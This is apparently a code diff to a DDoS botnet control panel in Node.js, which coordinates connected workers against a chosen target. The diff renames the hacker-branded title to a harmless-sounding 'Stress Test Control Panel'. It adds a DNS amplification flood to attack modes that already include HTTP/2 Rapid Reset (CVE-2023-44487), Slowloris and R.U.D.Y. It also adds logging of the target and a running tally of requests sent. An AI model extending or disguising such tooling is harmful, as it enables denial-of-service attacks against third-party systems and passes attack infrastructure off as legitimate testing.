@@ -12,7 +12,7 @@ const adminHTML = `<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>R1C4RD0 CTRL PANEL | BTR</title>
+    <title>Stress Test Control Panel</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -326,6 +326,7 @@ const adminHTML = `<!DOCTYPE html>
                 <select id="attackMode">
                     <option value="standard">Standard (HTTP Flood)</option>
                     <option value="http2-rapid-reset">HTTP/2 Rapid Reset (CVE-2023-44487)</option>
+                    <option value="dns-amplification">DNS Amplification (UDP Flood)</option>
                     <option value="slowloris">Slowloris (Slow Headers)</option>
                     <option value="slow-post">Slow POST (R.U.D.Y)</option>
                     <option value="xmlrpc">XML-RPC Flood</option>
@@ -1176,6 +1177,8 @@ function startStressTest(config) {
   }
   
   console.log(`[*] Attack started with ${workers.length} workers for ${config.duration}s`);
+  console.log(`[*] Attack Mode: ${config.attackMode || 'standard'}`);
+  console.log(`[*] Target: ${config.target}`);
   
   workers.forEach(worker => {
     worker.status = 'active';
@@ -1192,10 +1195,31 @@ function startStressTest(config) {
     config: config
   });
   
+  // Report stats every 10 seconds
+  const statsReporter = setInterval(() => {
+    if (!activeTest) {
+      clearInterval(statsReporter);
+      return;
+    }
+    
+    const activeWorkers = Array.from(clients.values()).filter(c => c.type === 'worker');
+    let totalSent = 0, totalSuccess = 0, totalFailed = 0;
+    
+    activeWorkers.forEach(w => {
+      totalSent += w.stats.sent || 0;
+      totalSuccess += w.stats.success || 0;
+      totalFailed += w.stats.failed || 0;
+    });
+    
+    const rate = totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : 0;
+    console.log(`[📊] Sent: ${totalSent} | Success: ${totalSuccess} | Failed: ${totalFailed} | Rate: ${rate}% | Workers: ${activeWorkers.length}`);
+  }, 10000);
+  
   // Auto-stop after duration and show report
   setTimeout(() => {
     if (activeTest) {
       console.log('[!] Attack duration completed');
+      clearInterval(statsReporter);
       stopStressTest();
     }
   }, config.duration * 1000 + 2000); // Add 2 seconds buffer for final stats
@@ -1293,6 +1317,3 @@ server.listen(PORT, '0.0.0.0', () => {
 ╚════════════════════════════════════════╝
   `);
 });
-
-
-
